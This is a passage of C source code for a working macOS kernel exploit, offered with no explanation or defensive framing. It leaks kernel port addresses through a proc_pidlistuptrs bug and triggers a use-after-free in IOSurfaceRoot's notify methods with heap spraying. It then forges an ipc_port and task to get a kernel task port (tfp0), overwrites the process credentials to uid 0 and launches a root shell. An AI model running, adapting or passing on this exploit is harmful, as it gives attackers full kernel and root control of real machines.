        exit(-1);
    }
    
    return var;
}

uint64_t rk64_via_fake_port(mach_port_t fake_port, uint64_t kaddr) {
    
    uint64_t low = rk32_via_fake_port(fake_port, kaddr);
    uint64_t high = rk32_via_fake_port(fake_port, kaddr + 4);
    
    return (high << 32) | low;
}

uint32_t rk32_via_tfp0(mach_port_t tfp0, uint64_t kaddr) {
    
    uint32_t var;
    mach_vm_size_t outsize;
    
    if (mach_vm_read_overwrite(tfp0, kaddr, sizeof(uint32_t), (mach_vm_address_t)&var, &outsize) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    if (outsize != sizeof(uint32_t)) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    return var;
}

uint64_t rk64_via_tfp0(mach_port_t tfp0, uint64_t kaddr) {
    
    uint64_t low = rk32_via_tfp0(tfp0, kaddr);
    uint64_t high = rk32_via_tfp0(tfp0, kaddr + 4);
    
    return (high << 32) | low;
}

void wk32_via_tfp0(mach_port_t tfp0, uint64_t kaddr, uint32_t var) {
    
    if (mach_vm_write(tfp0, kaddr, (vm_offset_t)&var, sizeof(uint32_t)) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
}

void wk64_via_tfp0(mach_port_t tfp0, uint64_t kaddr, uint64_t var) {
    
    uint32_t low = (uint32_t)(var & 0xffffffff);
    uint32_t high = (uint32_t)(var >> 32);
    
    wk32_via_tfp0(tfp0, kaddr, low);
    wk32_via_tfp0(tfp0, kaddr + 4, high);
}

void kmemcpy(uint64_t dest, uint64_t src, uint32_t len, mach_port_t tfp0) {
    //copy to kernel
    if (dest >= 0xffff000000000000) {
        
        if (mach_vm_write(tfp0, dest, src, len) != KERN_SUCCESS) {
            
            printf("exit line %d\n", __LINE__);
            exit(-1);
        }
    } else { // copy from kernel
        
        mach_vm_size_t outsize = 0;
        
        if (mach_vm_read_overwrite(tfp0, src, len, dest, &outsize) != KERN_SUCCESS) {
            
            printf("exit line %d\n", __LINE__);
            exit(-1);
        }
        
        if (outsize != len) {
            
            printf("exit line %d\n", __LINE__);
            exit(-1);
        }
    }
}

uint64_t port_kaddr_via_tfp0(mach_port_t tfp0, mach_port_t port, uint64_t task_self_port_kaddr) {
    
    uint64_t task_kaddr = rk64_via_tfp0(tfp0, task_self_port_kaddr + offsetof(struct ipc_port, ip_kobject));
    
    uint64_t itk_space_kaddr = rk64_via_tfp0(tfp0, task_kaddr + offsetof(struct task, itk_space));
    
    uint64_t is_table_kaddr = rk64_via_tfp0(tfp0, itk_space_kaddr + offsetof(struct ipc_space, is_table));
    
    uint32_t port_index = port >> 8;
    
    return rk64_via_tfp0(tfp0, is_table_kaddr + port_index * sizeof(struct ipc_entry));
}

//we stolen a kbuff from one msg we send to a new created port, we then remove the only one ipc_kmsg pointer from the ipc_kmsg queue of the ipc_port, we finally get a kbuff only we have
uint64_t stolen_kbuff(uint32_t kalloc_size, mach_port_t tfp0, uint64_t task_self_port_kaddr) {
    
    mach_port_t port;
    
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    uint64_t port_kaddr = port_kaddr_via_tfp0(tfp0, port, task_self_port_kaddr);
    
    mach_msg_size_t msg_size = msg_header_and_data_size_for_kalloc(kalloc_size);
    
    uint8_t *msg = malloc(msg_size);
    
    memset(msg, 0, msg_size);
    
    mach_msg_header_t *header = (mach_msg_header_t *)msg;
    
    header->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    //header->msgh_size
    header->msgh_remote_port = port;
    header->msgh_local_port = MACH_PORT_NULL;
    header->msgh_id = 0x41414142;
    
    if (mach_msg(header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    free(msg);
    
    //find the ipc_kmsg kbuff after we send one msg and kernel create it
    uint64_t ipc_kmsg_kaddr = rk64_via_tfp0(tfp0, port_kaddr + offsetof(struct ipc_port, ip_messages.data.port.messages.ikmq_base));
    
    wk64_via_tfp0(tfp0, port_kaddr + offsetof(struct ipc_port, ip_messages.data.port.messages.ikmq_base), 0);
    // msgcount = 0x00 qlimt = 0x05
    wk32_via_tfp0(tfp0, port_kaddr + offsetof(struct ipc_port, ip_messages.data.port.msgcount), 0x50000);
    
    mach_port_destroy(mach_task_self(), port);
    
    return ipc_kmsg_kaddr;
}

int main(int argc, const char * argv[]) {
    
    uint64_t task_self_port_kaddr = port_kaddr_via_proc_pidlistuptrs_bug(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    
    printf("task self port kaddr 0x%llx\n", task_self_port_kaddr);
    
    const uint32_t prepare_ports_num = 100000;
    mach_port_t prepare_ports[prepare_ports_num];
    
    for (uint i = 0; i < prepare_ports_num; i++) {
        
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, prepare_ports + i) != KERN_SUCCESS) {
            
            printf("exit line %d\n", __LINE__);
            exit(-1);
        }
    }
    
    //we need a bunch of smaller zone allocs to trigger gc
    uint32_t smaller_data_size = msg_header_and_data_size_for_kalloc(1024) - sizeof(mach_msg_header_t);
    
    uint8_t smaller_data[1024];
    
    memset(smaller_data, 'C', smaller_data_size);
    
    const uint32_t smaller_ports_num = 600; // 600 * 256 * 1024 = 150MB
    mach_port_t smaller_ports[smaller_ports_num];
    
    for (uint i = 0; i < smaller_ports_num; i++) {
        
        smaller_ports[i] = send_bunch_msg(smaller_data, smaller_data_size);
    }
    
    uint32_t msg_data_size = msg_header_and_data_size_for_kalloc(0x1000) - sizeof(mach_msg_header_t);
    uint32_t msg_data_offset = 0x1000 - msg_data_size - MAX_TRAILER_SIZE;
    
    mach_port_t target_port = MACH_PORT_NULL;
    uint64_t target_port_kaddr = 0;
    
    uint64_t fake_task_offset = (uint64_t)offsetof(struct ipc_port, ip_context) - (uint64_t)offsetof(struct task, bsd_info);
    
    //we need select a port at the bottom range of the large allocates(this range ports most likely allocate from a whole page and cut into pieces) to leak addr, because we wish colloct a whole page back which the port reside on when gc
    for (uint i = 0; i < 100; i++) {
        
        uint64_t port_kaddr = port_kaddr_via_proc_pidlistuptrs_bug(prepare_ports[prepare_ports_num - 1000 + i], MACH_MSG_TYPE_MAKE_SEND);
        
        // the ipc_port kaddr page offset of the target_port we select must within the msg data we can control the content, which the whole range is msg_data_offset ~ msg_data_offset + msg_data_size
        
        if ((port_kaddr & 0xfff) >= msg_data_offset
            && (port_kaddr & 0xfffffffffffff000) == ((port_kaddr + fake_task_offset) & 0xfffffffffffff000)
            && ((port_kaddr + fake_task_offset) & 0xfff) >= msg_data_offset
            && (port_kaddr & 0xfffffffffffff000) == ((port_kaddr + sizeof(struct ipc_port)) & 0xfffffffffffff000)
            && ((port_kaddr + sizeof(struct ipc_port)) & 0xfff) <= msg_data_offset + msg_data_size
            && (port_kaddr & 0xfffffffffffff000) == ((port_kaddr + fake_task_offset + sizeof(struct task)) & 0xfffffffffffff000)
            && ((port_kaddr + fake_task_offset + sizeof(struct task)) & 0xfff) <= msg_data_offset + msg_data_size) {
            
            target_port = prepare_ports[prepare_ports_num - 1000 + i];
            target_port_kaddr = port_kaddr;
            
            prepare_ports[prepare_ports_num - 1000 + i] = MACH_PORT_NULL;
            
            break;
        }
    }
    
    if (target_port == MACH_PORT_NULL) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    printf("we choose target port kaddr 0x%llx\n", target_port_kaddr);
    
    // fill data with the fake port and the fake task
    uint8_t data[0x1000];
    
    memset(data, 0, sizeof(data));
    
    ipc_port_t fake_port = (ipc_port_t)((uint64_t)data + ((target_port_kaddr & 0xfff) - msg_data_offset));
    
    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fake_port->ip_references = 0xf00d;
    fake_port->ip_srights = 0xf00d;
    fake_port->ip_receiver = NULL;
    fake_port->ip_context = 0x123456789abcdef; // change later
    // set the fake task kaddr of the fake port
    fake_port->ip_kobject = target_port_kaddr + fake_task_offset;
    
    struct task *fake_task = (struct task *)((uint64_t)fake_port + fake_task_offset);
    
    fake_task->ref_count = 0xd00d;
    fake_task->active = 1;
    fake_task->map = 0;
    //fake_task->lock =
    
    //we need send right to kernel task after target port become tfp0
    if (mach_port_insert_right(mach_task_self(), target_port, target_port, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    //then we triger the uaf bug
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    io_connect_t connect;
    
    if (IOServiceOpen(service, mach_task_self(), 0, &connect) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    uint64_t inputScalar[16];
    uint32_t inputScalarCnt = 0;
    
    char inputStruct[4096];
    size_t inputStructCnt = 0x18;
    
    uint64_t* ivals = (uint64_t*)inputStruct;
    ivals[0] = 1;
    ivals[1] = 2;
    ivals[2] = 3;
    
    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 0;
    
    char outputStruct[4096];
    size_t outputStructCnt = 0;
    
    uint64_t reference[8] = {0};
    uint32_t referenceCnt = 1;
    
    kern_return_t err;
    
    for(uint i = 0; i < 2; i++) {
        //s_set_surface_notify
        err = IOConnectCallAsyncMethod(connect, 17, target_port, reference, referenceCnt, inputScalar, inputScalarCnt, inputStruct, inputStructCnt, outputScalar, &outputScalarCnt, outputStruct, &outputStructCnt);
        
        printf("IOConnectCallAsyncMethod 17 err code: %d\n", err);
    }
    // s_remove_surface_notify
    err = IOConnectCallMethod(connect, 18, inputScalar, inputScalarCnt, inputStruct, inputStructCnt, outputScalar, &outputScalarCnt, outputStruct, &outputStructCnt);
    
    printf("IOConnectCallMethod 18 err code: %d\n", err);
    
    for (uint i = 0; i < prepare_ports_num; i++) {
        
        if (prepare_ports[i] == MACH_PORT_NULL) {
            
            continue;
        }
        
        mach_port_destroy(mach_task_self(), prepare_ports[i]);
    }
    
    // free smaller_ports msgs in order to satisfy gc
    for(uint i = 0; i < smaller_ports_num; i++) {
        
        mach_port_destroy(mach_task_self(), smaller_ports[i]);
    }
    
    // 1MB free once slowly, wish trigger gc
    const uint32_t replace_ports_num = 200;
    mach_port_t replace_ports[replace_ports_num];
    
    for (uint i = 0; i < 200; i++) { // 200 * 256 * 4096 = 200MB
        
        fake_port->ip_context = 0x1214161800000000 | i;
        
        replace_ports[i] = send_bunch_msg(data, msg_data_size);
        
        pthread_yield_np();
        
        usleep(10000);
        
        printf("gc consume times %d\n", i);
    }
    
    mach_port_context_t replace_context;
    
    if (mach_port_get_context(mach_task_self(), target_port, &replace_context) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    printf("get ip_context 0x%llx\n", replace_context);
    
    replace_context &= 0xffffffff;
    
    if (replace_context >= replace_ports_num) {
        
        printf("can not get ip_context we expect\n");
        exit(-1);
    }
    
    printf("we successfully match %lluth msg of the replace port on dangling target port\n", replace_context);
    
    printf("we now get target port under with fake ipc_port and fake task, we can then read anywhere in kernel first mach_port_set_context the kaddr - x10(p_pid offset of the proc struct) and read back the int value use pid_for_task mach trap\n");
    
    //we now try to loop task double list to get kernel vm_map
    uint64_t current_task_kaddr = rk64_via_fake_port(target_port, task_self_port_kaddr + offsetof(struct ipc_port, ip_kobject));
    
    uint64_t kern_vm_map_kaddr = 0;
    
    while ( current_task_kaddr != 0) {
        
        uint64_t bsd_info_kaddr = rk64_via_fake_port(target_port, current_task_kaddr + offsetof(struct task, bsd_info));
        // p_pid offset of struct proc is 0x10
        uint32_t pid = rk32_via_fake_port(target_port, bsd_info_kaddr + 0x10);
        
        if (pid == 0) {
            
            kern_vm_map_kaddr = rk64_via_fake_port(target_port, current_task_kaddr + offsetof(struct task, map));
            
            break;
        }
        
        current_task_kaddr = rk64_via_fake_port(target_port, current_task_kaddr + offsetof(struct task, tasks.prev));
    }
    
    printf("found kernel vm_map 0x%llx\n", kern_vm_map_kaddr);
    
    //we build the payload again with fake kernel task port and fake kernel task
    memset(data, 0, sizeof(data));
    
    fake_port = (ipc_port_t)((uint64_t)data + ((target_port_kaddr & 0xfff) - msg_data_offset));
    
    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fake_port->ip_references = 0xf00d;
    fake_port->ip_srights = 0xf00d;
    fake_port->ip_receiver = (struct ipc_space *)rk64_via_fake_port(target_port, task_self_port_kaddr + offsetof(struct ipc_port, ip_receiver));
    fake_port->ip_context = 0x123456789abcdef; // change later
    // set the fake task kaddr of the fake port
    fake_port->ip_kobject = target_port_kaddr + fake_task_offset;
    
    fake_task = (struct task *)((uint64_t)fake_port + fake_task_offset);
    
    fake_task->ref_count = 0xd00d;
    fake_task->active = 1;
    fake_task->map = kern_vm_map_kaddr;
    //fake_task->lock =
    
    // destroy the replace port(also will free msgs on it) and reallocate to send the second payload msg
    mach_port_destroy(mach_task_self(), replace_ports[replace_context]);
    replace_ports[replace_context] = MACH_PORT_NULL;
    
    const uint32_t second_replace_ports_num = 10;
    mach_port_t second_replace_ports[second_replace_ports_num];
    
    for (uint i = 0; i < second_replace_ports_num; i++) {
        
        fake_port->ip_context = i;
        second_replace_ports[i] = send_bunch_msg(data, msg_data_size);
    }
    
    if (mach_port_get_context(mach_task_self(), target_port, &replace_context) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    replace_context &= 0xffffffff;
    
    if (replace_context >= second_replace_ports_num) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    printf("we successfully match %lluth msg of the second replace port on dangling target port\n", replace_context);
    
    printf("we now get a fake kernal task port --------> target port 0x%x\n", target_port);
    
    for(uint i = 0; i < replace_ports_num; i++) {
        
        if (replace_ports[i] == MACH_PORT_NULL) {
            
            continue;
        }
        
        mach_port_destroy(mach_task_self(), replace_ports[i]);
    }
    
    mach_port_t second_replace_port = second_replace_ports[replace_context];
    second_replace_ports[replace_context] = MACH_PORT_NULL;
    
    for(uint i = 0; i < second_replace_ports_num; i++) {
        
        if (second_replace_ports[i] == MACH_PORT_NULL) {
            
            continue;
        }
        
        mach_port_destroy(mach_task_self(), second_replace_ports[i]);
    }
    
    //we still will get panic if touch the dangling target port alone, so we build a safer ftp0 without type confused ipc_kmsg data
    
    mach_port_t tfp0;
    
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    uint64_t stolen_kaddr = stolen_kbuff(0x1000, target_port, task_self_port_kaddr);
    
    printf("we stolen a kbuff %llx from kernel\n", stolen_kaddr);
    // we fake a kernel task on our stolen kbuff
    uint8_t fake_kernel_task[0x1000];
    
    memset(fake_kernel_task, 0, sizeof(fake_kernel_task));
    
    *(uint32_t *)(fake_kernel_task + offsetof(struct task, ref_count)) = 0xd00d;
    *(uint32_t *)(fake_kernel_task + offsetof(struct task, active)) = 1;
    *(uint64_t *)(fake_kernel_task + offsetof(struct task, map)) = kern_vm_map_kaddr;
    //*(uint8_t *)(fake_kernel_task + offsetof(struct task, LCK_MTX_TYPE)) = 0x22;
    
    kmemcpy(stolen_kaddr, (uint64_t)fake_kernel_task, 0x1000, target_port);
    
    // we also change our port to a task port which point to our fake kernel task
    
    uint64_t tfp0_kaddr = port_kaddr_via_tfp0(target_port, tfp0, task_self_port_kaddr);
    
    wk32_via_tfp0(target_port, tfp0_kaddr + offsetof(struct ipc_port, ip_bits), IO_BITS_ACTIVE | IKOT_TASK);
    wk32_via_tfp0(target_port, tfp0_kaddr + offsetof(struct ipc_port, ip_references), 0xf00d);
    wk32_via_tfp0(target_port, tfp0_kaddr + offsetof(struct ipc_port, ip_srights), 0xf00d);
    wk64_via_tfp0(target_port, tfp0_kaddr + offsetof(struct ipc_port, ip_receiver), rk64_via_tfp0(target_port, task_self_port_kaddr + offsetof(struct ipc_port, ip_receiver)));
    wk64_via_tfp0(target_port, tfp0_kaddr + offsetof(struct ipc_port, ip_kobject), stolen_kaddr);
    
    //we swap receive right of ftp0 to send right, so we can send msg to kernel task
    uint64_t task_self_kaddr = rk64_via_tfp0(target_port, task_self_port_kaddr + offsetof(struct ipc_port, ip_kobject));
    uint64_t itk_space_kaddr = rk64_via_tfp0(target_port, task_self_kaddr + offsetof(struct task, itk_space));
    uint64_t is_table_kaddr = rk64_via_tfp0(target_port, itk_space_kaddr + offsetof(struct ipc_space, is_table));
    uint32_t port_index = tfp0 >> 8;
    uint32_t bits = rk32_via_tfp0(target_port, is_table_kaddr + port_index * sizeof(struct ipc_entry) + offsetof(struct ipc_entry, ie_bits));
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32_via_tfp0(target_port, is_table_kaddr + port_index * sizeof(struct ipc_entry) + offsetof(struct ipc_entry, ie_bits), bits);
    
    printf("we now get the safer tfp0 built from stolen kbuff and swap tfp0 receive right to send right\n");
    
    printf("all things todo is clear up\n");
    
    // set fake target port type to NONE and set its task point to NULL, which can safely remove it later
    wk32_via_tfp0(tfp0, target_port_kaddr + offsetof(struct ipc_port, ip_bits), IO_BITS_ACTIVE | IKOT_NONE);
    wk64_via_tfp0(tfp0, target_port_kaddr + offsetof(struct ipc_port, ip_kobject), 0);
    
    //remove all rights of target port
    port_index = target_port >> 8;
    
    wk32_via_tfp0(tfp0, is_table_kaddr + port_index * sizeof(struct ipc_entry) + offsetof(struct ipc_entry, ie_bits), 0);
    
    //clear ipc_port pointer in the ipc_entry(struct ipc_object is the prefix part of struct ipc_port, so the pointer they can share)
    wk64_via_tfp0(tfp0, is_table_kaddr + port_index * sizeof(struct ipc_entry) + offsetof(struct ipc_entry, ie_object), 0);
    
    
    mach_port_destroy(mach_task_self(), second_replace_port);
    
    printf("all is done! tfp0 = 0x%x\n", tfp0);
    
    printf("we now try to get root shell\n");
    
    current_task_kaddr = rk64_via_tfp0(tfp0, task_self_port_kaddr + offsetof(struct ipc_port, ip_kobject));
    
    uint64_t bsd_info_kaddr = rk64_via_tfp0(tfp0, current_task_kaddr + offsetof(struct task, bsd_info));
    // proc->p_ucred
    uint64_t p_ucred_kaddr = rk64_via_tfp0(tfp0, bsd_info_kaddr + 232);
    
    //p_ucred.cr_uid
    wk32_via_tfp0(tfp0, p_ucred_kaddr + 24, 0);
    //p_ucred.cr_ruid
    wk32_via_tfp0(tfp0, p_ucred_kaddr + 28, 0);
    //p_ucred.cr_svuid
    wk32_via_tfp0(tfp0, p_ucred_kaddr + 32, 0);
    
    system("/bin/sh");
    
    return 0;
}
